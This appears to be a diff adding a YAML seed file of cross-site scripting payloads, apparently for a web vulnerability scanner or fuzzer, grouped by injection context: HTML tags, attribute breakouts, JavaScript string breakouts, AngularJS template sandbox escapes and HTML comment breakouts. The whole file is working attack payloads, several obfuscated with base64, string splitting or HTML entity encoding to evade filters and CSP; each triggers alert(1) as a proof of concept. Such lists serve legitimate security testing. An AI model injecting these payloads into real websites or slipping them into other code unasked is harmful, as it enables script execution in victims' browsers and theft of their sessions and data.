@@ -1,0 +1,78 @@
+# XSS 高级 payload：CSP 绕过 / DOM sink / 编码变体
+seeds:
+  xss:
+    html:
+      - raw: "<img src=x onerror=alert(1)>"
+        ctx: ["all"]
+      - raw: "<svg onload=alert(1)>"
+        ctx: ["all"]
+      - raw: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+        ctx: ["all"]
+      - raw: "<iframe srcdoc='<img src=x onerror=alert(1)>'></iframe>"
+        ctx: ["all"]
+      - raw: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+        ctx: ["all"]
+      - raw: "<svg><set attributeName=onmouseover onbegin=alert(1)>"
+        ctx: ["all"]
+      - raw: "<marquee onstart=alert(1)>"
+        ctx: ["all"]
+      - raw: "<body onpageshow=alert(1)>"
+        ctx: ["all"]
+      - raw: "<img src=x onerror=alert(1) onload=alert(2)>"
+        ctx: ["all"]
+      - raw: "<video><source onerror=alert(1)>"
+        ctx: ["all"]
+    attr:
+      - raw: "\\\" autofocus onfocus=alert(1)//"
+        ctx: ["all"]
+      - raw: "\\\" onmouseover=alert(1)//"
+        ctx: ["all"]
+      - raw: "\\\" onerror=alert(1)//"
+        ctx: ["all"]
+      - raw: "javascript:alert(1)"
+        ctx: ["all"]
+      - raw: "jav&#x61;script:alert(1)"
+        ctx: ["all"]
+      - raw: "&#106;avascript:alert(1)"
+        ctx: ["all"]
+      - raw: "\\\" onpointerenter=alert(1)//"
+        ctx: ["all"]
+      - raw: "\\\" onanimationstart=alert(1)//"
+        ctx: ["all"]
+      - raw: "\\\" ontransitionend=alert(1)//"
+        ctx: ["all"]
+    js:
+      - raw: "';alert(1)//"
+        ctx: ["all"]
+      - raw: "\\';alert(1);//"
+        ctx: ["all"]
+      - raw: "</script><script>alert(1)</script>"
+        ctx: ["all"]
+      - raw: "';eval(atob('YWxlcnQoMSk='));//"
+        ctx: ["all"]
+      - raw: "';new Function('al'+'ert(1)')();//"
+        ctx: ["all"]
+      - raw: "';top['al'%2b'ert'](1);//"
+        ctx: ["all"]
+      - raw: "';self['al'%2b'ert'](1);//"
+        ctx: ["all"]
+      - raw: "';window['al'+'ert'](1);//"
+        ctx: ["all"]
+    angular:
+      - raw: "{{constructor.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{[].constructor.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{$eval.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{x=['a'];x.constructor.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{constructor.constructor('eval(atob(\\'YWxlcnQoMSk=\\'))')()}}"
+        ctx: ["all"]
+    comment:
+      - raw: "--> <img src=x onerror=alert(1)>"
+        ctx: ["all"]
+      - raw: "--><script>alert(1)</script>"
+        ctx: ["all"]
+      - raw: "// --><img src=x onerror=alert(1)>"
+        ctx: ["all"]
